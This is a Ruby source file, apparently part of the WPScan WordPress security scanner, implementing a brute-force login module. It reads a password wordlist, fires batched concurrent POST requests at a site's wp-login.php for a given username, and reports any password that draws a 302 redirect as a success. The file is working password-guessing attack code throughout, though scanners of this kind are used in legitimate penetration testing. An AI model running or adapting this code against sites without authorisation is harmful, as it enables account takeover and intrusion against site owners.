# encoding: UTF-8

class WpUser < WpItem
  module BruteForcable

    # @param [ String ] wordlist The wordlist path
    # @param [ Hash ] options
    #
    # @return [ void ]
    def brute_force(wordlist, options = {})
      hydra               = Browser.instance.hydra
      number_of_passwords = BruteForcable.lines_in_file(wordlist)
      login_url           = @uri.merge('wp-login.php').to_s

      queue_count    = 0
      request_count  = 0

      File.open(wordlist, 'r').each do |line|
        line.strip!
        # ignore file comments, but will miss passwords if they start with a hash...
        next if line[0, 1] == '#'

        request_count += 1
        queue_count   += 1
        login          = self.login
        password       = line

        request = Browser.instance.forge_request(login_url,
          {
            method: :post,
            body: { log: login, pwd: password },
            cache_ttl: 0
          }
        )

        request.on_complete do |response|
          puts "\n  Trying Username : #{login} Password : #{password}" if options[:verbose]

          if valid_password?(response, password, options)
            self.password = password
            return # Used as break
          end
        end

        hydra.queue(request)

        print "\r  Brute forcing user '#{login}' with #{number_of_passwords} passwords... #{(request_count * 100) / number_of_passwords}% complete." if options[:show_progression]

        # it can take a long time to queue 2 million requests,
        # for that reason, we queue @threads, send @threads, queue @threads and so on.
        # hydra.run only returns when it has recieved all of its,
        # responses. This means that while we are waiting for @threads,
        # responses, we are waiting...
        if queue_count >= Browser.instance.max_threads
          hydra.run
          queue_count = 0
          puts "Sent #{Browser.instance.max_threads} requests ..." if options[:verbose]
        end
      end

      # run all of the remaining requests
      hydra.run
    end

    # @param [ Typhoeus::Response ] response
    # @param [ String ] password
    # @param [ Hash ] options
    #
    # @return [ Boolean ]
    def valid_password?(response, password, options = {})
      if response.code == 302
        puts "\n  " + green('[SUCCESS]') + " Login : #{login} Password : #{password}\n" if options[:show_progression]
        return true
      elsif response.body =~ /login_error/i
        puts "\nIncorrect login and/or password." if options[:verbose]
      elsif response.timed_out?
        puts red('ERROR:') + ' Request timed out.' if options[:show_progression]
      elsif response.code == 0
        puts red('ERROR:') + ' No response from remote server. WAF/IPS?' if options[:show_progression]
      elsif response.code.to_s =~ /^50/
        puts red('ERROR:') + ' Server error, try reducing the number of threads.' if options[:show_progression]
      else
        puts "\n" + red('ERROR:') + " We received an unknown response for #{password}..." if options[:show_progression]

        # HACK to get the coverage :/ (otherwise some output is present in the rspec)
        puts red("Code: #{response.code}") if options[:verbose]
        puts red("Body: #{response.body}") if options[:verbose]
        puts if options[:verbose]
      end
      false
    end

    # Counts the number of lines in the wordlist
    # It can take a couple of minutes on large
    # wordlists, although bareable.
    #
    # Each line which starts with # is ignored
    #
    # @param [ String ] file_path
    #
    # @return [ Integer ]
    def self.lines_in_file(file_path)
      lines = 0
      File.open(file_path, 'r').each do |line|
        lines += 1 if line.strip[0,1] != '#'
      end
      lines
    end

  end
end
